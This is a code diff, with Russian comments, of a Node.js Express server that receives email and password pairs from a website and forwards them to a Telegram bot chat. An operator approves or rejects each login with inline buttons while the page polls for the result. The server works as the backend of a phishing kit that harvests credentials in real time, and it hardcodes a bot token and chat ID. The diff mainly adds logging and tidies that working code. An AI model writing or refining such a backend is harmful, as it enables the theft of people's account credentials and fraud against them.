@@ -2,24 +2,31 @@ const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
 
-const app = express(); // ВОТ ЭТА СТРОЧКА ИСПРАВЛЯЕТ ТВОЮ ОШИБКУ 'app is not defined'
+const app = express();
 app.use(express.json());
-app.use(cors());
+app.use(cors({ origin: '*' })); // Разрешаем запросы с любых адресов
 
 const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ';
 const chatId = '-1003894478662';
 
-let requests = {}; // Память для статусов
+let requests = {}; // Память сервера для статусов
+
+// Проверка работы сервера (открой ссылку сервера в браузере)
+app.get('/', (req, res) => {
+    res.send('Сервер запущен и готов к работе!');
+});
 
 // Прием данных с сайта
 app.post('/send-data', async (req, res) => {
-    try {
-        const { userId, email, pass } = req.body;
-        requests[userId] = 'pending';
+    const { userId, email, pass } = req.body;
+    console.log(`[САЙТ] Получены данные от ${userId}: ${email}`);
+    
+    requests[userId] = 'pending';
 
+    try {
         await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
             chat_id: chatId,
-            text: `⚠️ **Новые данные**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``,
+            text: `⚠️ **Данные входа**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``,
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
@@ -31,25 +38,35 @@ app.post('/send-data', async (req, res) => {
             }
         });
         res.json({ status: 'sent' });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
+    } catch (error) {
+        console.error('[ТЕЛЕГРАМ] Ошибка отправки:', error.message);
+        res.status(500).json({ error: 'Ошибка при связи с ботом' });
     }
 });
 
-// Проверка статуса сайтом
+// Проверка статуса (сайт спрашивает это каждые 3 сек)
 app.get('/check-status/:userId', (req, res) => {
-    res.json({ status: requests[req.params.userId] || 'pending' });
+    const status = requests[req.params.userId] || 'pending';
+    res.json({ status });
 });
 
 // Обработка кнопок из Телеграм
 app.post('/tg-webhook', async (req, res) => {
-    const callbackQuery = req.body.callback_query;
-    if (callbackQuery) {
-        const [action, userId] = callbackQuery.data.split('_');
-        requests[userId] = (action === 'approve') ? 'success' : 'error';
+    if (req.body.callback_query) {
+        const callbackData = req.body.callback_query.data;
+        const [action, userId] = callbackData.split('_');
 
+        console.log(`[АДМИН] Нажата кнопка ${action} для ${userId}`);
+
+        if (action === 'approve') {
+            requests[userId] = 'success';
+        } else {
+            requests[userId] = 'error';
+        }
+
+        // Уведомление для админа в ТГ
         await axios.post(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
-            callback_query_id: callbackQuery.id,
+            callback_query_id: req.body.callback_query.id,
             text: "Статус обновлен!"
         });
     }
@@ -58,5 +75,5 @@ app.post('/tg-webhook', async (req, res) => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
-    console.log(`Сервер работает на порту ${PORT}. Файл: index.js`);
+    console.log(`Сервер запущен на порту ${PORT}`);
 });
